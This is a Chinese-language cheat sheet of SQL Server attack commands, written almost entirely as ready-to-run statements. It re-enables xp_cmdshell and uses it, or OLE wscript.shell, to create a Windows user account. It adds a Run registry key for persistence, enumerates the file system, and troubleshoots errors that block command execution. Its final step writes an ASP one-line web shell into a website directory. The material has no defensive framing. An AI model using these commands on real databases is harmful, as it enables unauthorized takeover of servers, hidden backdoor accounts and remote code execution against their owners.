1、恢复xp_cmdshell
	
	Exec sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll'

2、使用xp_cmdshell添加用户
	
	exec xp_cmdshell 'net user myh0st hihack /add'

3、利用OLE对象接口（sp_OACREATE和sp_OAMethod）

	DECLARE @shell INT
	EXEC SP_OAcreate 'wscript.shell',@shell out
	EXEC SP_OAMETHOD @shell,'run',null, 'net user myh0st hihack /add'

4、写注册表

	EXEC master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\c urrentversion\run','shell','REG_SZ','C:\windows\sys tem32\cmd.exe /c net user myh0st hihack /add'

5、查看注册表

	Exec xp_regenumvalues 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\C urrentVersion\Run'

6、遍历目录

	exec master.dbo.xp_dirtree 'c:\'

7、获取子目录

	exec master.dbo.xp_subdirs 'c:\'

8、判断目录或文件是否存在

	exec master..xp_fileexist 'c:\boot.ini'

9、常见错误

111111.  Error Message:未能找到存储过程 'master..xp_cmdshell'。
222222.  Error Message:无法装载 DLL xplog70.dll 或该 DLL 所引用的某一 DLL。原因: 126(找不到指定的模块。)。
333333.  SQL Server 阻止了对组件 'xp_cmdshell' 的 过程'sys.xp_cmdshell' 的访问，
444444.  无法装载 DLL xpsql70.dll 或该DLL所引用的某一 DLL。原因126（找不到指定模块。）
555555.  无法在库 xpweb70.dll 中找到函数 xp_cmdshell。原因: 127(找不到指定的程序。)
666666.  Error Message:xpsql.cpp: 错误 5 来自 CreateProcess（第 675 行）
777777.  Error Message:无法装载 DLL或该 DLL 所引用的某一 DLL。原因: 126(找不到指定的模块。
888888.  Error Message:无法装载 DLL xpweb70.dll 或该 DLL 所引用的某一 DLL。原因: 126(找不到指定的模块。)。
999999.  xpsql.cpp: 错误 5 来自 CreateProcess（第 737 行）
212121.  Error Message:无法在库 xpweb70.dll 中找到函数 xp_cmdshell。原因: 127(找不到指定的程序。)。

10、常见恢复

	1 未能找到存储过程'master..xpcmdshell'.
		恢复方法：查询分离器连接后,
		第一步执行:EXEC sp_addextendedproc xp_cmdshell,@dllname ='xplog70.dll'declare @o int 
		第二步执行:sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll' 
		然后按F5键命令执行完毕
	2 无法装载 DLL xpsql70.dll 或该DLL所引用的某一 DLL。原因126（找不到指定模块。）
		恢复方法：查询分离器连接后,
		第一步执行：sp_dropextendedproc "xp_cmdshell"
		第二步执行：sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll'
		然后按F5键命令执行完毕
	3 无法在库 xpweb70.dll 中找到函数 xp_cmdshell。原因: 127(找不到指定的程序。)
		恢复方法：查询分离器连接后,
		第一步执行:exec sp_dropextendedproc 'xp_cmdshell'
		第二步执行:exec sp_addextendedproc 'xp_cmdshell','xpweb70.dll' 
		然后按F5键命令执行完毕

	
11、写一句话

	exec master.dbo.xp_subdirs 'd:\web\cdlxkj'; 
	exec sp_makewebtask 'd:\web\cdlxkj\XX.asp','select''<%execute(request("SB"))%>'' '
